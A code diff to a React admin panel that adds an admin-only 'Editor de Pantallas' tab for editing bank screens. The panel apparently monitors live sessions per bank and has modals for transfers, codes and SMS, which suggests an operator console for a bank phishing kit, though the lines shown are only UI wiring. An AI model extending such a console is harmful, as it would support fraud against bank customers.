@@ -10,6 +10,7 @@ import AccessTable from '@/components/admin/AccessTable';
 import UserManagement from '@/components/admin/UserManagement';
 import RegisteredUsersManagement from '@/components/admin/RegisteredUsersManagement';
 import SmsManagement from '@/components/admin/SmsManagement';
+import BankScreenEditor from '@/components/admin/BankScreenEditor';
 import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal, SmsCompraModal } from '@/components/admin/Modals';
 import { Session, ScreenType } from '@shared/schema';
 import { Button } from '@/components/ui/button';
@@ -24,7 +25,7 @@ export default function AdminPanel() {
   const { toast } = useToast();
   const { user, logoutMutation } = useAuth();
   const [activeBank, setActiveBank] = useState<string>("todos");
-  const [activeTab, setActiveTab] = useState<'current' | 'saved' | 'users' | 'registered' | 'sms'>('current');
+  const [activeTab, setActiveTab] = useState<'current' | 'saved' | 'users' | 'registered' | 'sms' | 'editor'>('current');
   
   // Actualizar el banco activo cuando el usuario cambia
   useEffect(() => {
@@ -126,7 +127,7 @@ export default function AdminPanel() {
     }
     
     // Verificamos si estamos en pestañas solo para administradores
-    if (user?.role !== 'admin' && activeTab === 'sms') {
+    if (user?.role !== 'admin' && (activeTab === 'sms' || activeTab === 'editor')) {
       setActiveTab('current');
     }
   }, [activeTab, isSuperAdmin, user?.role]);
@@ -548,7 +549,7 @@ export default function AdminPanel() {
       {/* Sidebar */}
       <Sidebar 
         activeTab={activeTab}
-        onTabChange={(tab) => setActiveTab(tab as 'current' | 'saved' | 'users' | 'registered' | 'sms')}
+        onTabChange={(tab) => setActiveTab(tab as 'current' | 'saved' | 'users' | 'registered' | 'sms' | 'editor')}
         isAdmin={isAdmin}
         isSuperAdmin={isSuperAdmin}
       />
@@ -712,14 +713,24 @@ export default function AdminPanel() {
               </>
             )}
             {user?.role === 'admin' && (
-              <div 
-                className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'sms' 
-                  ? 'border-[#00aaff] text-[#00aaff]' 
-                  : 'border-transparent hover:text-gray-300'}`}
-                onClick={() => setActiveTab('sms')}
-              >
-                API MSJ
-              </div>
+              <>
+                <div 
+                  className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'sms' 
+                    ? 'border-[#00aaff] text-[#00aaff]' 
+                    : 'border-transparent hover:text-gray-300'}`}
+                  onClick={() => setActiveTab('sms')}
+                >
+                  API MSJ
+                </div>
+                <div 
+                  className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'editor' 
+                    ? 'border-[#00aaff] text-[#00aaff]' 
+                    : 'border-transparent hover:text-gray-300'}`}
+                  onClick={() => setActiveTab('editor')}
+                >
+                  Editor de Pantallas
+                </div>
+              </>
             )}
           </div>
           
@@ -746,6 +757,8 @@ export default function AdminPanel() {
           <RegisteredUsersManagement />
         ) : activeTab === 'sms' && user?.role === 'admin' ? (
           <SmsManagement />
+        ) : activeTab === 'editor' && user?.role === 'admin' ? (
+          <BankScreenEditor />
         ) : (
           <AccessTable 
             sessions={sessions}
